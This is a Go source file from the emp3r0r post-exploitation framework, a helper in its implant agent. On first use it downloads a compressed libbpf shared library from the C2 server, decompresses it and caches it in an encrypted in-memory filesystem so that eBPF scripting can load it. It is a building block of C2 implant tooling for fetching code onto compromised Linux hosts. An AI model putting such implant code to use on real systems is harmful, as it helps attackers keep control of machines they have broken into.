//go:build linux && !android && (386 || amd64 || arm64)

package modules

import (
	"fmt"
	"runtime"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/lib/libbpf"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// Wire the in-memory libbpf loader to the module dependency fetcher, so the
// ebpf_* Starlark builtins can map libbpf.so on first use.
func init() {
	libbpf.SetFetcher(func() ([]byte, error) { return fetchDependencySO("libbpf") })
}

// fetchDependencySO mirrors fetchDependencyDLL for Linux shared libraries. It
// checks the encrypted memfs cache first, then downloads the C2-hosted
// <name>.<arch>.gz payload and caches it.
func fetchDependencySO(name string) ([]byte, error) {
	name = strings.ToLower(name)
	rawKey := "memfs:///" + name + ".so"
	if cached, err := util.ReadFileAgent(rawKey); err == nil && len(cached) > 0 {
		logging.Debugf("fetchDependencySO: hit memfs cache %s", rawKey)
		return cached, nil
	}

	hostedName := fmt.Sprintf("%s.%s.gz", name, runtime.GOARCH)
	compressed, err := fetchFile(common.RuntimeConfig, "", hostedName, "", "")
	if err != nil {
		return nil, fmt.Errorf("fetching %s: %w", hostedName, err)
	}
	data, err := util.Decompress(compressed)
	if err != nil {
		return nil, fmt.Errorf("decompressing %s: %w", hostedName, err)
	}
	if err := util.WriteFileAgent(rawKey, data, 0o600); err != nil {
		logging.Debugf("fetchDependencySO: caching %s failed: %v", rawKey, err)
	}
	return data, nil
}
